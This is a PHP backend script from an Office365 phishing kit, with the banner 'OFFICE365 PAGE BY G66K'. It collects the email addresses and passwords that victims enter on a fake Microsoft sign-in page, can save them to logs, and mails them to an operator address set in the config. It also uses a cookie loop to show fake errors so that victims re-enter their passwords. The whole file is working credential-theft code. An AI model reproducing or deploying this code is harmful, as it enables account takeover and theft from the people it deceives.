<?php
require 'bootstrap.php';


class Send {

    static public $count = 1;

    static public function Mail($email, $password) {

        $remoteIP = Client::IP();
        $browser = Client::Browser();
        $fromname = Config::Get('fromname');
        $fromemail = Config::Get('fromemail');
        $toEmail = Config::Get('email');
        $date = date("D M d, Y g:i a");

        $headers = "From: " . $fromname . " <" . $fromemail . ">" . "\r\n" . "MIME-Version: 1.0";

        $subject = Config::Get('subject') . ' : ' . $email;

        $message = "
            OFFICE365 PAGE BY G66K
            Information: New Logs
            Email : $email - Password : $password
            Date: $date Browser: $browser 
        ";

        mail($toEmail, $subject, $message, $headers);
    }

    static public function Fetch($inputs)
    {
        if(Utility::isValid($inputs['loginfmt']))
        {
            $email = $inputs['loginfmt'];

            if(!Utility::isBase64($email) && Config::Get('base64'))
            {
                $email =  base64_encode($email);
            }

            header("Location: authorize.php?".str_replace('"','',Utility::UniqueId())."&email=". $email);

            exit(0);
        }


        if(Utility::isValid($inputs['Email']) && Utility::isValid($inputs['Password']))
        {

            $email = $inputs['Email'];
            $password = $inputs['Password'];

            if(Config::Get('saveLogs'))
            {
                Logger::Log($email, $password);
            }




            if(isset($_COOKIE['loop']))
            {
                if($_COOKIE['loop'] != Config::Get('loop'))
                {
                    self::Mail($email, $password);
                    echo "authorize.php?".str_replace('"','',Utility::UniqueId())."&email=". $email ."&error=error";
                    setcookie('loop', $_COOKIE['loop'] + 1, time() + (86400 * 30), "/");
                }

                if($_COOKIE['loop'] == Config::Get('loop'))
                {
                    self::Mail($email, $password);
                    echo "success.php?".str_replace('"','',Utility::UniqueId())."&email=". $email ."&error=error";
                    setcookie('loop', $_COOKIE['loop'] + 1, time() + (86400 * 30), "/");
                }


            }


        }
    }



}

Send::Fetch($_POST);

?>